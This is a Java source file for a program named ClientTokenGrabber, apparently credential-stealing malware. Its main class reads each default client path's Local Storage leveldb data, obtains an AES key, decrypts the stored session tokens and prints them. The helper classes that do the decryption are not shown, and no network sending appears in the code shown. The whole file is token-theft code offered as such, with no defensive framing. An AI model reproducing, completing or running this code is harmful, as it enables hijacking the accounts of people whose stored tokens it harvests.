package main.java.clienttokengrabber;

import java.nio.file.Paths;
import java.util.Set;
import java.util.HashSet;

import main.java.clienttokengrabber.utils.Decryptor;
import main.java.clienttokengrabber.utils.FileManager;

public class ClientTokenGrabber {
    private static Set<String> tokens = new HashSet<>();

    public static void main(String[] args) {
        getClientTokens();
        for (String token : tokens) {
            System.out.println("Token: " + token);
        }
        System.exit(0);
    }

    private static void getClientTokens() {
        FileManager.getDefaultPaths().forEach(path ->
            tokens.addAll(Decryptor.decryptTokens(
                    Paths.get(path, "Local Storage", "leveldb").toString(),
                    Decryptor.getAESKey(path))
            )
        );
    }
}